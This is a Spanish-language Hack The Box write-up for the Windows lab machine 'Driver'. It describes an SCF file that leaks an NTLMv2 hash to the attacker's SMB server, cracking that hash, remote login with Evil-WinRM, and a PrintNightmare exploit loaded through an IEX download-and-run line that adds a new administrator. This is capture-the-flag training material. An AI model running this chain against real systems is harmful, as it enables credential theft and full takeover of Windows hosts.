---
title: "Driver - Hack The Box"
date: 2023-05-22
draft: false
slug: "htb-writeup-driver"
excerpt: "Es una máquina relativamente sencilla, comenzamos entrando al servicio HTTP, el cual nos pedirá credenciales para poder entrar, adivinamos las credenciales y enumerando el sitio web, encontramos que podemos subir archivos. La página acepta archivos SCF, podemos obtener un hash que contiene usuario y contraseña del protocolo SMB si cargamos un archivo SCF malicioso. Crackeando el hash con la herramienta JohnTheRipper nos conectamos de manera remota con Evil-WinRM al protocolo SMB y gracias a la herramienta WinPEAS, encontramos el proceso spoolv activo, que es vulnerable al Exploit CVE-2021-1675 - PrintNightmare LPE, siendo que podemos crear un usuario administrador nuevo y nuevamente con Evil-WinRM ganamos acceso como Administrador en la máquina Windows."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "SMB", "MFP Firmware Upload", "SCF Malicious File", "Cracking Hash", "System Recognition (Windows)", "Local Privilege Escalation (LPE)", "Abusing Vuln Process Spoolsv", "Privesc - PrintNightmare Exploit (CVE-2021-1675)", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "impacket-smbserver"
  - "JohnTheRipper"
  - "Crackmapexec"
  - "Evil-WinRM"
  - "whoami"
  - "systeminfo"
  - "winPEAS"
  - "python3"
  - "net"
links:
  - "https://filext.com/es/extension-de-archivo/SCF"
  - "https://www.file-extension.info/es/format/scf"
  - "https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/"
  - "https://www.hackplayers.com/2017/11/usando-un-archivo-scf-malicioso-dentro.html"
  - "https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe"
  - "https://github.com/calebstewart/CVE-2021-1675"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-driver/driver_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un **ping** para saber si la máquina está activa y en base al **TTL** veremos que **SO** opera en la máquina.
```bash
ping -c 4 10.10.11.106
PING 10.10.11.106 (10.10.11.106) 56(84) bytes of data.
64 bytes from 10.10.11.106: icmp_seq=1 ttl=127 time=143 ms
64 bytes from 10.10.11.106: icmp_seq=2 ttl=127 time=139 ms
64 bytes from 10.10.11.106: icmp_seq=3 ttl=127 time=138 ms
64 bytes from 10.10.11.106: icmp_seq=4 ttl=127 time=139 ms

--- 10.10.11.106 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 138.484/139.591/142.586/1.731 ms
```
Por el **TTL** sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.106 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 19:01 CST
Initiating SYN Stealth Scan at 19:01
Scanning 10.10.11.106 [65535 ports]
Discovered open port 135/tcp on 10.10.11.106
Discovered open port 80/tcp on 10.10.11.106
Discovered open port 445/tcp on 10.10.11.106
Completed SYN Stealth Scan at 19:02, 28.43s elapsed (65535 total ports)
Nmap scan report for 10.10.11.106
Host is up, received user-set (0.34s latency).
Scanned at 2023-05-22 19:01:51 CST for 29s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack ttl 127
135/tcp open  msrpc        syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.56 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 26 (1.144KB)
```

| Parametros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo solamente 3 puertos abiertos y pienso que la intrusión será por el **puerto 80** o por el **puerto 445**, veamos que nos dice el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p80,135,445 10.10.11.106 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 19:04 CST
Nmap scan report for 10.10.11.106
Host is up (0.14s latency).

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0

|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|_clock-skew: mean: 7h00m16s, deviation: 0s, median: 7h00m15s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-05-23T08:05:10
|_  start_date: 2023-05-23T07:58:54

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.88 seconds
```

| Parametros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Mmmmm veo cosas raras, por ejemplo en el **puerto 80** menciona que debemos meter una contraseña para el usuario admin, entonces no sé qué pueda ser.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos.

<p align="center">
<img src="/assets/images/htb-writeup-driver/Captura1.png">
</p>

Nos pide una contraseña. Veamos que pasa si no ponemos nada:

<p align="center">
<img src="/assets/images/htb-writeup-driver/Captura2.png">
</p>

No pues nada, pero **Wappalizer** si muestra algo, veámoslo:

<p align="center">
<img src="/assets/images/htb-writeup-driver/Captura3.png">
</p>

Mmmmm, pues antes de irnos a ver el puerto 445, tratemos de poner credenciales conocidas, por si tenemos suerte.

<p align="center">
<img src="/assets/images/htb-writeup-driver/Captura4.png">
</p>

a... Bueno, el usuario y contraseña que puse, fueron:
* User: *admin*
* Passwd: *admin*

Veamos que dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-driver/Captura5.png">
</p>

Veo que está programado en **PHP**, investiguemos la página para ver si podemos incluir archivos.

<p align="center">
<img src="/assets/images/htb-writeup-driver/Captura6.png">
</p>

Y si se puede, pero lo malo es que hay varias opciones:

<p align="center">
<img src="/assets/images/htb-writeup-driver/Captura7.png">
</p>

Por lo que no sé, cuál de estas opciones es la correcta para subir el archivo y qué tipo de extensión podemos subir. Analicemos el mensaje que pone la imagen anterior:

| **Traducción** |
|:-----------:|
| *Seleccione el modelo de impresora y cargue la actualización de firmware correspondiente a nuestro recurso compartido de archivos. Nuestro equipo de pruebas revisará las cargas manualmente e iniciará las pruebas pronto. Ícono de validado por la comunidad.* |

Ósea, que no va directamente a la máquina, sino a un **servidor aparte**, además, lo van a "revisar y probar", por lo que "pueden" descubrir que algo malo está pasando. Entonces, no sirve de nada subir una **Reverse Shell**. Por lo demás, entiendo que debemos crear un archivo que tenga la actualización.

Entonces, ¿Qué podemos hacer? Existe una forma de obtener un **hash** de un usuario para esta clase de casos y esto se llama **SCF Malicious File**. Pero primero, veamos de que trata ese archivo:

| **Extensión .scf** |
|:------------------:|
| *Los archivos SCF pertenecen principalmente a Windows de Microsoft. Un archivo SCF es un archivo que almacena información sobre la secuencia de ADN y que actúa de forma similar a un archivo ABI, pero contiene más información y es menos propenso a errores. También son utilizados por el símbolo del sistema operativo Windows como archivo de comandos Shell. En esta aplicación, el archivo SCF almacena comandos de shell, y es similar a los archivos BAT o CMD*. |

Aquí más información sobre estos archivos: <a href="https://filext.com/es/extension-de-archivo/SCF" target="_blank">Archivos con Extensión .scf</a>

Ahora, veamos de que trata ese **archivo malicioso SCF**:

| **SCF Malicious File** |
|:-----------------------:|
| *Durante un test de intrusión, es posible encontrarse con un recurso de red de un servidor Windows con permisos de escritura para todos. A parte de intentar obtener información sensible, existe una forma para abusar de este recurso y poder obtener los hashes de las contraseñas de todos los usuarios que naveguen por esa carpeta compartida. Para ello, se utilizará un archivo SCF malicioso. Se trata de un Shell Command File, es decir, un archivo de comandos de Windows Explorer, que nosotros usaremos para enviar el archivo SCF malicioso. Se puede usar un archivo SCF para acceder a una ruta UNC específica que permite que el probador de penetración cree un ataque.* |

Aquí puedes encontrar más información sobre este ataque:
* <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" target="_blank">Archivo Malicioso .SCF 1</a>
* <a href="https://www.hackplayers.com/2017/11/usando-un-archivo-scf-malicioso-dentro.html" target="_blank">Archivo Malicioso .SCF 2</a>

En resumen, al subir el archivo **SCF** a través de archivos compartidos **SMB**, nuestro servidor, se tratará de autenticar para compartir un archivo random, al hacerlo con el código malicioso, obtendremos un usuario y un **hash** que puede contener la contraseña del usuario obtenido.

En ambas páginas, viene un script que nos permitirá subir un archivo random (que no importa si este archivo lo tengas o no)  hacia el servicio **SMB** que está operando en esta máquina. Vamos a utilizar el script de la siguiente página: <a href="https://www.hackplayers.com/2017/11/usando-un-archivo-scf-malicioso-dentro.html" target="_blank">Archivo Malicioso .SCF 2</a>

Copialo en un archivo nuevo y vamos a modificarlo para que descargue un archivo random (que repito, no importa si existe o no este archivo), desde nuestra máquina a través de un servidor **SMB**. Hagámoslo por pasos en la siguiente sección.

## Explotación de Vulnerabilidades {#Explotacion}

### Creando Archivo Malicioso SCF y Obteniendo Credenciales {#SCF}

* Copia y crea el archivo:
```bash
nano file.scf
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

* Modifica el código, poniendo tu **IP** y especificando el **servidor SMB**, recuerda que el archivo no importa que no exista:
```bash
[Shell]  
Command=2
IconFile=\\Tu_IP\smbFolder\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

* Abre el servidor **SMB** en donde tengas el archivo **SCF**:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

* Sube el archivo a la página:

<p align="center">
<img src="/assets/images/htb-writeup-driver/Captura8.png">
</p>

* Observa lo que pasa en el servidor **SMB** de tu máquina:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.106,49414)
[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:aaaaaaaaaaaaaaaa:5a0d651031ca97e2d20e5abf5039dfcb:010
```

Excelente, tenemos un usuario y un **hash** con posible contraseña.

Este ataque se puede hacer con la herramienta **Responder**, pero es mejor usarla para casos de **Active Directory** y en esta máquina eso está de más.

### Descifrando Hash y Probando Credenciales {#Hash}

Para descifrar el **hash**, vamos a copiarlo todo, guardarlo en un archivo y usaremos la herramienta **John The Ripper**, obvio por pasos:

* Copia y pega todo el **hash** en un archivo:
```bash
nano hash
tony::DRIVER:aaaaaaaaaaaaaaaa:5a0d651031ca97e2d20e5abf5039dfcb:010
```

* Usa el diccionario **rockyou.txt** junto a la herramienta **John The Ripper** para descifrar el **hash**:
```bash
john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)     
1g 0:00:00:00 DONE (2023-05-22 23:18) 20.00g/s 634880p/s 634880c/s 634880C/s !!!!!!..225566
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Listo, tenemos las credenciales:
* User: *tony*
* Passwd: *liltony*

Vamos a probar si son correctas para el servidor **SMB** de la máquina víctima usando la herramienta **crackmapexec**:
```bash
crackmapexec smb 10.10.11.106 -u 'tony' -p 'liltony'
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony
```

Bien, tratemos de ver si es posible conectarnos por **winrm** para poder usar la herramienta **Evil-WinRM** y conectarnos de manera remota:
```bash
crackmapexec winrm 10.10.11.106 -u 'tony' -p 'liltony'
SMB         10.10.11.106    5985   DRIVER           [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

Muy bien, ahora usa esa herramienta con las credenciales para conectarte:
```bash
evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents>
```

Tardo un poquito, pero ya nos conectamos de manera remota, solo busca la flag y continuamos con las post explotación:
```batch
*Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> dir

    Directory: C:\Users\tony\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/23/2023  12:59 AM             34 user.txt

*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
...
```

## Post Explotación {#Post}

### Enumerando Máquina Víctima {#Enum}

Como siempre, vamos a revisar privilegios:
```batch
*Evil-WinRM* PS C:\Users\tony\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

No veo algo que nos pueda ayudar, veamos la información del sistema para poder usar la herramienta **Windows Exploit Suggester**:
```batch
*Evil-WinRM* PS C:\Users\tony\Desktop> systeminfo
systeminfo.exe : ERROR: Access denied
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

A canijo, no pues no. Esta es una excelente oportunidad para usar la herramienta **WinPEAS**, que nos ayuda a **encontrar vulnerabilidades en sistemas Windows**.

#### Utilizando WinPEAS para Encontrar Vulnerabilidades {#WinPEAS}

Gracias a **Evil-WinRM**, podemos cargar la herramienta **WinPEAS** con el comando **upload** de la siguiente forma:
```batch
*Evil-WinRM* PS C:\Windows\Temp\Privesc> upload PATH_Donde_Tengas_El_winPEAS.exe
Info: Uploading PATH_Donde_Tengas_El_winPEAS.exe

Data: 2703360 bytes of 2703360 bytes copied

Info: Upload successful!
```

Listo, puedes verificar que se cargó la herramienta:
```batch
*Evil-WinRM* PS C:\Windows\Temp\Privesc> dir

    Directory: C:\Windows\Temp\Privesc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/23/2023   6:01 AM        2027520 winPEASx64.exe
```

Y la ejecutamos:
```batch
*Evil-WinRM* PS C:\Windows\Temp\Privesc> .\winPEASx64.exe
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
...
...
...
```

Leyendo todo lo que nos sacó el **winPEASx64.exe**, vemos lo siguiente:
```batch
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                       
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         716             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49408         0.0.0.0               0               Listening         452             wininit
  TCP        0.0.0.0               49409         0.0.0.0               0               Listening         868             svchost
  TCP        0.0.0.0               49410         0.0.0.0               0               Listening         828             svchost
  TCP        0.0.0.0               49411         0.0.0.0               0               Listening         1184            spoolsv
  TCP        0.0.0.0               49412         0.0.0.0               0               Listening         572             services
  TCP        0.0.0.0               49413         0.0.0.0               0               Listening         580             lsass
  TCP        10.10.11.106          139           0.0.0.0               0               Listening         4               System
```
Existe un Exploit para **spoolsv** llamado **PrintNightmare LPE**, así que vamos a usar este Exploit. Te dejo el link para que lo veas: <a href="https://github.com/calebstewart/CVE-2021-1675" target="_blank">PrintNightmare LPE - CVE-2021-1675</a>

### Utilizando Exploit PrintNightmare LPE (PowerShell) {#Exploit}

Solamente vamos a ocupar el archivo **.ps1** que viene en el **GitHub**, cópialo en tu máquina con **wget**.

Una vez que lo tengas copiado, vamos a subirlo a la máquina, a través de un **servidor en Python** y en la máquina con **IEX**, hagámoslo por pasos:

* Abre el servidor en **Python** en donde tengas el Exploit:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Carga el Exploit en la máquina con **IEX**:
```batch
*Evil-WinRM* PS C:\Windows\Temp\Privesc> IEX(New-Object Net.WebClient).downloadString('http://Tu_IP/CVE-2021-1675.ps1')
```

* Vemos los usuarios que hay:
```batch
*Evil-WinRM* PS C:\Windows\Temp\Privesc> net user
User accounts for \\
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
tony
The command completed with one or more errors.
```

* Usamos el código que viene en el **GitHub** para crear un nuevo usuario administrador:
```batch
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Invoke-Nightmare -DriverName "Xerox" -NewUser "berserkW" -NewPassword "SuperSecure"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user berserkW as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

* Comprobamos que se creó el nuevo usuario administrador:
```batch
*Evil-WinRM* PS C:\Windows\Temp\Privesc> net user
User accounts for \\
-------------------------------------------------------------------------------
Administrator            berserkW                 DefaultAccount
Guest                    tony
The command completed with one or more errors.
```

* Comprobamos con **Crackmapexec**, si el usuario y contraseña sirven:
```bash
crackmapexec winrm 10.10.11.106 -u 'berserkW' -p 'SuperSecure'
SMB         10.10.11.106    5985   DRIVER           [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\berserkW:SuperSecure (Pwn3d!)
```

* Nos conectamos por **Evil-WinRM** y obtenemos la flag:
```batch
evil-winrm -i 10.10.11.106 -u 'berserkW' -p 'SuperSecure'
Evil-WinRM shell v3.4
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\berserkW\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
    Directory: C:\Users\Administrator\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/23/2023  12:59 AM             34 root.txt
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
Listo, ya completamos esta máquina.
